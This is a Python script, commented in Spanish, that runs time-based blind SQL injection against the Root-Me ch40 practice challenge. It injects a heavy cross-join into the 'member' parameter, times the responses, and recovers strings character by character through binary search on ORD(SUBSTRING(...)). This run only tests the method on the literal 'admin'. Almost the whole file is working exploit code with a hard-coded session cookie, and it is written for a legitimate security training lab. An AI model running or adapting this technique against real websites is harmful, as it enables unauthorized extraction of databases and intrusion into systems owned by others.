#!/usr/bin/env python3
"""
SQL INJECTION TIME-BASED - ROOT-ME CH40
VERSIÓN 41 - EXTRACCIÓN CON BÚSQUEDA BINARIA
"""
import requests
import time
import statistics

URL = "http://challenge01.root-me.org/web-serveur/ch40/"
COOKIE = {"PHPSESSID": "fbf0fdc633505f66eef3f20808f0d1ce"}

class TimeBasedSQLInjector:
    def __init__(self):
        self.session = requests.Session()
        self.session.cookies.update(COOKIE)
        self.threshold = 35
        self.heavy = "(SELECT COUNT(*) FROM usuarios, usuarios T1, usuarios T2)"
        self.technique = "1 OR ({cond}) OR {heavy}"
        
    def test_payload(self, payload, repeats=5):
        tiempos = []
        params = {"action": "member", "member": payload}
        for _ in range(repeats):
            inicio = time.perf_counter_ns()
            try:
                r = self.session.get(URL, params=params, timeout=5)
                tiempo = (time.perf_counter_ns() - inicio) / 1_000_000
                tiempos.append(tiempo)
            except:
                tiempos.append(0)
            time.sleep(0.1)
        return statistics.median(tiempos) if tiempos else 0
    
    def is_true(self, condition):
        payload = self.technique.format(cond=condition, heavy=self.heavy)
        t = self.test_payload(payload, repeats=3)
        return t < self.threshold
    
    def extract_char(self, query, pos):
        """Extrae un carácter usando búsqueda binaria con ORD"""
        low, high = 32, 126
        
        while low <= high:
            mid = (low + high) // 2
            # Usar ORD en lugar de ASCII
            cond = f"ORD(SUBSTRING(({query}), {pos}, 1)) > {mid}"
            
            if self.is_true(cond):
                low = mid + 1
            else:
                high = mid - 1
        
        return chr(low)
    
    def extract_string(self, query, label="Extrayendo", max_len=50):
        print(f"\n[*] {label}...")
        print(f"    Query: {query}")
        result = ""
        for pos in range(1, max_len + 1):
            char = self.extract_char(query, pos)
            result += char
            print(f"    [{pos}] '{char}' (ASCII: {ord(char)})")
            if ord(char) == 0 or ord(char) == 32:
                break
            time.sleep(0.1)
        return result

# ============================================================
# EJECUCIÓN
# ============================================================
injector = TimeBasedSQLInjector()

print("="*70)
print("  EXTRACCIÓN CON BÚSQUEDA BINARIA (usando ORD)")
print("="*70)

# 1. Verificar que la técnica funciona
print("\n[1] Verificando técnica...")
print(f"  1=1: {injector.is_true('1=1')} (debería ser True)")
print(f"  1=2: {injector.is_true('1=2')} (debería ser False)")

if injector.is_true('1=1') == True and injector.is_true('1=2') == False:
    print("  ✅ Técnica funciona correctamente")
else:
    print("  ❌ Técnica NO funciona")
    exit()

# 2. Extraer 'admin'
print("\n[2] Extrayendo 'admin' con SELECT 'admin':")
admin = injector.extract_string("SELECT 'admin'", "SELECT 'admin'")
print(f"\n  Resultado: '{admin}'")
print(f"  Esperado: 'admin'")

if admin == "admin":
    print("  ✅ ¡ÉXITO! La extracción funciona")
else:
    print("  ❌ La extracción NO funciona")
    print("  Probando con diferentes métodos...")
    
    # Probar con diferentes funciones
    print("\n[3] Probando con MID...")
    admin_mid = injector.extract_string("SELECT MID('admin', 1, 5)", "MID('admin')")
    print(f"  Resultado MID: '{admin_mid}'")
    
    print("\n[4] Probando con SUBSTR...")
    admin_substr = injector.extract_string("SELECT SUBSTR('admin', 1, 5)", "SUBSTR('admin')")
    print(f"  Resultado SUBSTR: '{admin_substr}'")
